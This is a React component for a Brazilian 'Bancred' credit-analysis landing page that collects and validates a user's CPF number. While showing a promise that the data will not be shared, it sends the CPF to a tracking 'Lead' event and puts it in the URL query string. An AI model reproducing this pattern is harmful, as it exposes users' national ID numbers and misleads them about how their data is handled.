import { useState, FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import { UserCheck, Check } from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import SocialProofToast from "@/components/SocialProofToast";
import PartnerBanksFooter from "@/components/PartnerBanksFooter";
import { trackEvent } from "@/lib/tracking";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatCPF = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  let out = digits;
  if (digits.length > 3) out = `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length > 6) out = `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  if (digits.length > 9) out = `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  return out;
};

// Valida CPF pelo algoritmo dos dígitos verificadores (Receita Federal)
const isValidCPF = (raw: string) => {
  const cpf = raw.replace(/\D/g, "");
  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false; // todos iguais

  const calcDigit = (sliceLen: number) => {
    let sum = 0;
    for (let i = 0; i < sliceLen; i++) {
      sum += parseInt(cpf.charAt(i), 10) * (sliceLen + 1 - i);
    }
    const rest = (sum * 10) % 11;
    return rest === 10 ? 0 : rest;
  };

  return calcDigit(9) === parseInt(cpf.charAt(9), 10) &&
    calcDigit(10) === parseInt(cpf.charAt(10), 10);
};

const CPF = () => {
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [touched, setTouched] = useState(false);
  const navigate = useNavigate();

  const digitsLen = cpf.replace(/\D/g, "").length;
  const isComplete = digitsLen === 11;
  const isValid = isComplete && isValidCPF(cpf);

  const validate = (value: string): string | null => {
    const len = value.replace(/\D/g, "").length;
    if (len === 0) return "Informe seu CPF.";
    if (len < 11) return "CPF incompleto. Digite os 11 números.";
    if (!isValidCPF(value)) return "CPF inválido. Verifique os números digitados.";
    return null;
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    setTouched(true);
    const err = validate(cpf);
    setError(err);
    if (err) return;

    const incoming = new URLSearchParams(window.location.search);
    const qs = new URLSearchParams();
    qs.set("cpf", cpf);
    const nome = incoming.get("nome");
    if (nome) qs.set("nome", nome);
    trackEvent({ event: "Lead", external_id: cpf.replace(/\D/g, "") });
    navigate(`/analise?${qs.toString()}`);
  };

  // Mostra erro só depois que o usuário interagiu (touched) ou tentou enviar
  const showError = touched && error;

  return (
    <div
      style={{
        minHeight: "100dvh",
        display: "flex",
        flexDirection: "column",
        background: "#FFFFFF",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
          paddingTop: "calc(14px + env(safe-area-inset-top))",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main style={{ flex: 1, background: "#F9FAFB", padding: "48px 16px" }}>
        <div style={{ maxWidth: 448, margin: "0 auto" }}>
          <div
            style={{
              background: "#FFFFFF",
              border: "1px solid #E5E7EB",
              borderRadius: 16,
              boxShadow: "0 10px 25px -10px rgba(17,24,39,0.15)",
              padding: 24,
            }}
          >
            <div style={{ textAlign: "center", marginBottom: 24 }}>
              <div
                style={{
                  width: 64,
                  height: 64,
                  background: "#EFF6FF",
                  border: "2px solid #BFDBFE",
                  borderRadius: "50%",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto 16px",
                }}
              >
                <UserCheck width={32} height={32} color="#2563EB" />
              </div>
              <h1
                style={{
                  fontSize: 24,
                  fontWeight: 600,
                  color: "#0F172A",
                  letterSpacing: -0.4,
                  marginBottom: 8,
                }}
              >
                Vamos começar sua análise
              </h1>
              <p style={{ color: "#64748B", fontSize: 15 }}>Informe seu CPF para começar</p>
            </div>

            <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: 24 }}>
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                <label htmlFor="cpf" style={{ fontSize: 14, fontWeight: 500, color: "#0F172A" }}>
                  CPF
                </label>
                <input
                  id="cpf"
                  type="text"
                  inputMode="numeric"
                  autoComplete="off"
                  placeholder="000.000.000-00"
                  maxLength={14}
                  value={cpf}
                  aria-invalid={!!showError}
                  aria-describedby={showError ? "cpf-error" : undefined}
                  onChange={(e) => {
                    const v = formatCPF(e.target.value);
                    setCpf(v);
                    if (touched) setError(validate(v));
                  }}
                  onBlur={(e) => {
                    setTouched(true);
                    setError(validate(cpf));
                    e.currentTarget.style.borderColor = showError ? "#DC2626" : "#D1D5DB";
                    e.currentTarget.style.boxShadow = "none";
                  }}
                  style={{
                    width: "100%",
                    padding: "16px 16px",
                    borderRadius: 12,
                    border: `1px solid ${showError ? "#DC2626" : "#D1D5DB"}`,
                    background: "#FFFFFF",
                    fontSize: 16,
                    fontWeight: 500,
                    fontFamily: fontStack,
                    outline: "none",
                    color: "#111827",
                  }}
                  onFocus={(e) => {
                    const color = showError ? "#DC2626" : "#2563EB";
                    const ring = showError ? "rgba(220,38,38,0.2)" : "rgba(37,99,235,0.2)";
                    e.currentTarget.style.borderColor = color;
                    e.currentTarget.style.boxShadow = `0 0 0 2px ${ring}`;
                  }}
                />
                {showError && (
                  <p
                    id="cpf-error"
                    role="alert"
                    style={{
                      fontSize: 13,
                      color: "#DC2626",
                      fontWeight: 500,
                      marginTop: 2,
                    }}
                  >
                    {error}
                  </p>
                )}
              </div>

              <button
                type="submit"
                disabled={!isValid}
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                  width: "100%",
                  padding: "14px 16px",
                  borderRadius: 12,
                  background: "#2563EB",
                  color: "#FFFFFF",
                  fontSize: 16,
                  fontWeight: 600,
                  border: "none",
                  cursor: isValid ? "pointer" : "not-allowed",
                  opacity: isValid ? 1 : 0.7,
                  transition: "background 0.2s",
                  fontFamily: fontStack,
                }}
                onMouseEnter={(e) => {
                  if (isValid) e.currentTarget.style.background = "#1D4ED8";
                }}
                onMouseLeave={(e) => {
                  if (isValid) e.currentTarget.style.background = "#2563EB";
                }}
              >
                Continuar
              </button>

              <div style={{ marginTop: -8, display: "flex", flexDirection: "column", gap: 4 }}>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <Check width={12} height={12} color="#16A34A" />
                  <p style={{ fontSize: 12, color: "#64748B" }}>
                    Seus dados estão protegidos e não serão compartilhados
                  </p>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <Check width={12} height={12} color="#16A34A" />
                  <p style={{ fontSize: 12, color: "#64748B" }}>
                    Análise em tempo real sem afetar seu score
                  </p>
                </div>
              </div>
            </form>
          </div>
        </div>
      </main>

      <PartnerBanksFooter />

      <SocialProofToast />
    </div>
  );
};

export default CPF;
